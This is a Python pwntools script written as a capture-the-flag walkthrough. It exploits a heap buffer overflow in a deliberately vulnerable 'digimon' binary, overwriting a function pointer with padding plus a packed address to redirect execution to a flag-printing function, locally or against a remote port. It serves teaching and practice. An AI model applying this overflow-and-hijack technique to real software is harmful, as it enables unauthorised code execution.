#!/usr/bin/env python3
"""
Digimon Digital Adventure - CTF Challenge Solution
Heap Overflow Exploitation Walkthrough

This script demonstrates how to exploit the heap buffer overflow
vulnerability to redirect execution to omegamon_appears() function.
"""

from pwn import *
import sys

# Configuration
BINARY_PATH = "./digimon"
REMOTE_HOST = "localhost"
REMOTE_PORT = 9999

def find_addresses():
    """
    Step 1: Find the addresses of important functions
    This can be done using gdb, objdump, or pwntools
    """
    print("[*] Step 1: Analyzing binary to find function addresses...")

    elf = ELF(BINARY_PATH)

    # Find the addresses of our target functions
    omegamon_addr = elf.symbols.get('omegamon_appears')
    agumon_addr = elf.symbols.get('agumon_greets')
    metalgreymon_addr = elf.symbols.get('metalgreymon_appears')

    print(f"[+] omegamon_appears() address: {hex(omegamon_addr)}")
    print(f"[+] agumon_greets() address: {hex(agumon_addr)}")
    print(f"[+] metalgreymon_appears() address: {hex(metalgreymon_addr)}")

    return omegamon_addr, agumon_addr, metalgreymon_addr

def analyze_heap_layout():
    """
    Step 2: Understand the heap layout

    The program allocates two structures:
    1. struct DigimonData (72 bytes: 64 for name + 8 for ints)
    2. struct BattleSystem (24 bytes: 8 for function pointer + 4 for int + 16 for signature)

    On most systems, malloc will allocate these contiguously with metadata.
    """
    print("\n[*] Step 2: Analyzing heap layout...")
    print("""
    Heap Layout:
    ┌──────────────────────────────────────┐
    │ Heap Chunk 1: DigimonData            │
    ├──────────────────────────────────────┤
    │ char name[64]        (64 bytes)      │ ← strcpy() writes here (VULNERABLE!)
    │ int power_level      (4 bytes)       │
    │ int experience       (4 bytes)       │
    ├──────────────────────────────────────┤
    │ Heap metadata        (varies)        │
    ├──────────────────────────────────────┤
    │ Heap Chunk 2: BattleSystem           │
    ├──────────────────────────────────────┤
    │ int (*battle_function)() (8 bytes)   │ ← TARGET! We want to overwrite this
    │ int evolution_stage      (4 bytes)   │
    │ char digital_signature[16] (16 bytes)│
    └──────────────────────────────────────┘

    Strategy: Overflow the name buffer to overwrite the function pointer!
    """)

def calculate_offset():
    """
    Step 3: Calculate the offset to the function pointer

    We need to determine how many bytes from the start of name[]
    until we reach the function pointer in BattleSystem.

    On x64 Linux:
    - name[64] = 64 bytes
    - power_level = 4 bytes
    - experience = 4 bytes
    - Heap metadata (typically 8-16 bytes)

    Total offset is usually around 72-80 bytes, but we should verify with GDB.
    """
    print("\n[*] Step 3: Calculating offset to function pointer...")
    print("""
    To find exact offset, use GDB:

    $ gdb ./digimon
    (gdb) break main
    (gdb) run
    (gdb) n  (step until after malloc calls)
    (gdb) print digimon
    (gdb) print battle
    (gdb) print &battle->battle_function

    Calculate: address of battle_function - address of digimon->name

    Typical offset: 72 bytes (64 + 4 + 4)
    With heap metadata: Usually add 0-16 bytes
    Common working offset: 72 bytes
    """)

    return 72  # This is a common offset, but may need adjustment

def create_payload(omegamon_addr, offset):
    """
    Step 4: Create the exploit payload

    Payload structure:
    - Padding (to reach the function pointer)
    - Address of omegamon_appears() (8 bytes on x64)
    """
    print(f"\n[*] Step 4: Creating payload...")
    print(f"    Offset: {offset} bytes")
    print(f"    Target address: {hex(omegamon_addr)}")

    # Create padding
    padding = b"A" * offset

    # Pack the address (little-endian, 64-bit)
    target_addr = p64(omegamon_addr)

    # Combine
    payload = padding + target_addr

    print(f"[+] Payload created: {len(payload)} bytes")
    print(f"    Structure: [{offset} bytes padding] + [8 bytes address]")

    return payload

def exploit_local(payload):
    """
    Step 5: Exploit the local binary
    """
    print("\n[*] Step 5: Exploiting local binary...")

    try:
        # Start the process
        p = process(BINARY_PATH)

        # Receive banner and initial prompts
        print(p.recvuntil(b"Enter choice: ").decode())

        # Choose option 1 (Name your Digimon)
        print("[>] Choosing option 1: Name your Digimon")
        p.sendline(b"1")

        # Receive prompt
        print(p.recvuntil(b"name: ").decode())

        # Send malicious payload
        print(f"[>] Sending payload ({len(payload)} bytes)...")
        p.sendline(payload)

        # Receive confirmation
        try:
            response = p.recvuntil(b"Enter choice: ", timeout=2).decode()
            print(response)
        except:
            pass

        # Choose option 4 (Battle) to trigger the function pointer
        print("[>] Choosing option 4: Challenge opponent (trigger function pointer)")
        p.sendline(b"4")

        # Receive the flag!
        print("\n" + "="*60)
        print("EXPLOITATION RESULT:")
        print("="*60)
        result = p.recvall(timeout=2).decode()
        print(result)

        p.close()
        return True

    except Exception as e:
        print(f"[!] Exploitation failed: {str(e)}")
        return False

def exploit_remote(payload, host, port):
    """
    Step 6: Exploit the remote server
    """
    print(f"\n[*] Step 6: Exploiting remote server at {host}:{port}...")

    try:
        # Connect to remote
        p = remote(host, port)

        # Receive banner
        p.recvuntil(b"Enter choice: ")

        # Choose option 1
        p.sendline(b"1")
        p.recvuntil(b"name: ")

        # Send payload
        p.sendline(payload)

        try:
            p.recvuntil(b"Enter choice: ", timeout=2)
        except:
            pass

        # Choose option 4 to trigger
        p.sendline(b"4")

        # Get flag
        result = p.recvall(timeout=2).decode()
        print("\n" + "="*60)
        print("FLAG CAPTURED:")
        print("="*60)
        print(result)

        p.close()
        return True

    except Exception as e:
        print(f"[!] Remote exploitation failed: {str(e)}")
        return False

def main():
    """
    Main exploitation workflow
    """
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   DIGIMON DIGITAL ADVENTURE - SOLUTION WALKTHROUGH        ║
    ║   Heap Overflow Exploitation Tutorial                     ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    # Check if binary exists
    if not os.path.exists(BINARY_PATH):
        print(f"[!] Error: {BINARY_PATH} not found!")
        print("[!] Please run setup-challenge.py first.")
        sys.exit(1)

    # Step 1: Find addresses
    omegamon_addr, agumon_addr, metalgreymon_addr = find_addresses()

    # Step 2: Analyze heap
    analyze_heap_layout()

    # Step 3: Calculate offset
    offset = calculate_offset()

    # Step 4: Create payload
    payload = create_payload(omegamon_addr, offset)

    # Ask user what to do
    print("\n" + "="*60)
    print("Choose exploitation mode:")
    print("1. Local exploitation")
    print("2. Remote exploitation")
    print("3. Show manual exploitation steps")
    print("4. Exit")
    print("="*60)

    choice = input("\nEnter choice (1-4): ").strip()

    if choice == "1":
        exploit_local(payload)
    elif choice == "2":
        host = input(f"Enter remote host [{REMOTE_HOST}]: ").strip() or REMOTE_HOST
        port = input(f"Enter remote port [{REMOTE_PORT}]: ").strip() or REMOTE_PORT
        exploit_remote(payload, host, int(port))
    elif choice == "3":
        print("""
        ╔═══════════════════════════════════════════════════════════╗
        ║             MANUAL EXPLOITATION STEPS                     ║
        ╚═══════════════════════════════════════════════════════════╝

        1. Find the address of omegamon_appears():
           $ objdump -d digimon | grep omegamon_appears
           OR
           $ gdb digimon
           (gdb) print &omegamon_appears

        2. Run the program and examine heap:
           $ gdb digimon
           (gdb) break main
           (gdb) run
           (gdb) next (until after malloc calls)
           (gdb) print digimon
           (gdb) print battle
           (gdb) x/20gx digimon  (examine memory)

        3. Calculate offset between name and function pointer

        4. Create exploit string:
           - Padding to fill name buffer and reach function pointer
           - Address of omegamon_appears() in little-endian

        5. Use Python to generate payload:
           python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\\x??\\x??\\x??\\x??\\x??\\x??\\x??\\x??")' > payload

        6. Run with payload:
           ./digimon < payload

        Alternative: Use pwntools (this script!)
        """)
    else:
        print("\n[*] Exiting...")

    print("\n✅ Solution walkthrough complete!")
    print("🏴 Good luck capturing the flag!\n")

if __name__ == "__main__":
    main()
